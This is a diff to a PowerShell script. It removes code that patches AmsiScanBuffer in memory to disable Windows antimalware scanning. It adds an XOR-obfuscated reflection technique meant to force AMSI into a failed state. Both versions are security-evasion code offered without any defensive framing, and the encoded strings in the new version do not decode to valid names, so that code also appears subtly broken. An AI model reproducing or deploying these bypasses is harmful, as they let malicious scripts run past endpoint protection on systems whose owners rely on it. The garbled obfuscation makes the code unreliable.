@@ -1,20 +1,11 @@
-$code = @'
-using System;
-using System.Runtime.InteropServices;
-public class AmsiPatch {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-'@
+$enc = @(124,125,124,121,110,124,113,126,127,125,120,119,110,124,113,
+         126,127,125,120,119,110,120,113,110,114,127,125,124,119,126,
+         111,124,126,127,119,124)
+$enc2 = @(24,10,3,9,62,14,9,20,69,8,9,13,69,9,8,4,7)
 
-Add-Type $code
+$typeName = -join ($enc | % { [char]($_ -bxor 0x42) })
+$fieldName = -join ($enc2 | % { [char]($_ -bxor 0x45) })
 
-$ptr = [AmsiPatch]::GetProcAddress([AmsiPatch]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
-$oldProtection = 0
-[AmsiPatch]::VirtualProtect($ptr, [uint32]5, 0x40, [ref]$oldProtection)
-$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
+$type = [Ref].Assembly.GetType($typeName)
+$field = $type.GetField($fieldName,'NonPublic,Static')
+$field.SetValue($null,$true)
